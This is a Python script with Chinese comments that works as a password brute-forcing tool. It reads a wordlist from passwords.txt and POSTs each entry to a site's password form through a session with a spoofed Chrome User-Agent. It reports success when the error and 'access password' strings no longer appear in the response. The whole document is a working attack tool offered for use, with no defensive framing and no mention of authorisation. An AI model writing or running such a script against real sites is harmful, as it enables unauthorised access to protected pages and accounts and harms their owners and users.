import requests
import time

def read_passwords(file_path):
    """"""
    with open(file_path, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip()]

def attempt_login(url, passwords):
    """"""
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    })
    
    # 
    session.get(url)
    
    for password in passwords:
        try:
            # 构造登录请求数据
            login_data = {
                'password': password
            }
            response = session.post(url, data=login_data, timeout=10)
            
            # 判断是否成功
            if "错误" not in response.text and "访问密码" not in response.text:
                print(f"登录成功！使用的密码是：{password}")
                # 可在这里添加登录成功后的操作，比如访问页面内容
                # success_page = session.get("登录后的页面地址")
                # print(success_page.text)
                return True
            else:
                print(f"密码 {password} 登录失败")
        except requests.exceptions.Timeout:
            print(f"请求超时，跳过密码 {password}")
        except Exception as e:
            print(f"发生错误：{e}，跳过密码 {password}")
        
    
    return False

if __name__ == "__main__":
    target_url = "https://example.com"
    password_file = "passwords.txt"
    
    print(f"开始尝试登录 {target_url}")
    print(f"从 {password_file} 读取密码...")
    
    passwords = read_passwords(password_file)
    if not passwords:
        print("密码文件为空或未找到，请检查文件内容")
    else:
        success = attempt_login(target_url, passwords)
        if not success:
            print("所有密码尝试完毕，登录失败")
